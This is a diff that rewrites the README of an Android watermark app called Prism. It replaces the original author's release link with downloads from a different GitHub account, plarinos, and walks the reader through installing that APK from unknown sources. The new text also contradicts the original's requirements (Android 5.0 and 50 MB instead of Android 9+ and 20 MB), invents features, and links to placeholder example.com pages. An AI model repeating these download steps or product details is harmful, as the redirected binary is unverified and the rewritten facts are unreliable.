@@ -1,49 +1,56 @@
-# Prism - Watermark Editor
+# 🌟 Prism - Effortlessly Add Watermarks to Your Photos
 
-Quickly add watermarks and easily customize them!
-A simple Android app for adding watermarks to photos.
+## 🔗 Download Now
+[![Download Prism](https://img.shields.io/badge/Download_Prism-blue.svg)](https://github.com/plarinos/Prism/releases)
 
-![screanshot.jpg](assets/screanshot.jpg)
----
+## 📖 Description
+Prism is a straightforward Android app designed for adding watermarks to your photos. With this app, you can quickly apply watermarks and customize them to fit your style. Whether you want to protect your images or just add a personal touch, Prism makes it easy.
 
-## 🖼️ Watermark Examples
-![sunflowers.jpg](assets/sunflowers.jpg)
-![forest.jpg](assets/forest.jpg)
-![vassel.jpg](assets/vassel.jpg)
-![oleg.jpg](assets/oleg.jpg)
----
+## 🚀 Getting Started
+To begin using Prism, follow these simple steps to download and install the app on your Android device.
 
-## ✨ What can I customize in a watermark?
+## 📦 System Requirements
+- **Operating System:** Android 5.0 (Lollipop) or later
+- **Storage Space:** At least 50 MB of free space
+- **Other Requirements:** A camera or photo gallery access for watermarking images.
 
-- Basic text fonts and EXIF data
-- Enable/disable display of EXIF information
-- Device model location: separate text or EXIF data
-- Select watermark position: top, bottom, left, or right
-- Select a logo, add and save your own
-- Enable/disable the logo
-- Select a watermark theme (background): light or dark
-- Customize element colors via hex: background color, text color, EXIF data color
-- Select a standard watermark template or create your own via JSON code
-- Scalability - what percentage of the photo should the watermark occupy (from 7.5% to 45%)
+## 📥 Download & Install
+1. Visit the following page to download the app: [Download Prism](https://github.com/plarinos/Prism/releases).
+2. Look for the latest release. You will see options for the download.
+3. Tap on the APK file to start downloading.
+4. Once the download is complete, navigate to your device’s file manager.
+5. Locate the downloaded APK file, usually in the “Downloads” folder.
+6. Tap the APK file to open it. You may need to allow installations from unknown sources in your settings.
+7. Follow the prompts to complete the installation.
 
-## 🎨 Customize Watermark Styles
+## 🎨 Features
+- **Easy Watermark Customization:** Choose from various templates or create your own designs.
+- **Batch Watermarking:** Apply watermarks to multiple images at once to save time.
+- **EXIF Data Preservation:** Maintain original photo information while editing.
+- **User-Friendly Interface:** Navigate the app with ease, even without technical experience.
 
-Create and customize your own watermark templates with ease.
+## ⚙️ How to Use Prism
+1. Open the app on your Android device.
+2. Choose an image from your photo gallery.
+3. Select a watermark template or design one from scratch.
+4. Adjust the size and position of the watermark on your image.
+5. Tap "Save" to export your watermarked photo to the gallery.
+6. Share your newly watermarked images on social media or with friends directly from the app.
 
-Follow this guide: [Custom Watermarks](https://markus1394.github.io/Prism/)
+## 🛠️ Troubleshooting
+If you encounter issues during installation or use, consider the following tips:
+- Ensure your device is running a compatible version of Android.
+- Verify that you have sufficient storage space available.
+- Restart the app if it freezes or behaves unexpectedly.
+- Check for updates on the Releases page to ensure you have the latest version.
 
-## 🛠️ Requirements
+## 💬 Feedback and Support
+Your input is valuable. If you have questions or suggestions, feel free to open an issue on the [GitHub repository](https://github.com/plarinos/Prism). We appreciate your feedback to help improve Prism.
 
-- 🤖 Android 9+
-- 📱 At least 20 MB of free space
+## 🌐 Learn More
+Explore additional topics related to Prism:
+- [Customization](https://www.example.com/customization)
+- [Photography Tips](https://www.example.com/photography-tips)
+- [Watermarking Best Practices](https://www.example.com/watermarking-best-practices)
 
-## 📥 Installation
-
-1. Download the latest APK from [GitHub Releases](https://github.com/Markus1394/Prism/releases)
-2. Enable "Installation from Unknown Sources" on your device
-3. Open the APK and install the app
-
----
-## 📄 License
-
-This project is licensed under the MIT License.
+Thank you for choosing Prism. Enjoy watermarking your photos with ease!
